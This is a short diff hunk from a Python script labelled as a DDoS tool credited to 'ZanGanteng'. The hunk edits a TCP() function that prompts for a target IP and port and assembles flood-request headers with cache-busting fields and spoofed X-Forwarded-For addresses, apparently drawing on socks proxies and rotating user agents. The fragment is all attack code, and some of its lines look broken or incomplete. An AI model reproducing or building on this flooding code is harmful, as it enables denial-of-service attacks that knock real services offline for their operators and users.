@@ -310,13 +310,8 @@ tp = """This Ddos Credit:ZanGanteng"""
 def TCP():
   global byte1, useragents, socks2, ref
   global time
-  ip = str(input("Enter <>> IP >>"))
-  port = int(input("Enter <>> IP >>"))
-  connection += "Cache-Control: max-age=0\r\n"
-  connection2 = "Connection: Keep-Alive\r\n"
-  connection2 += "Cache-Control: max-age=0\r\n"
-  connection3 = "Connection: Keep-Alive\r\n"
-  connection3 += "Cache-Control: max-age=0\r\n"
+  ip = str(input("Enter <>> IP >="))
+  port = int(input("Enter <>> Port/t >="))
   connection += "pragma: no-cache\r\n"
   connection += "X-Forwarded-For: " + spoof1() + "\r\n"
   connection2 += "X-Forwarded-For: " + spoof2() + "\r\n"
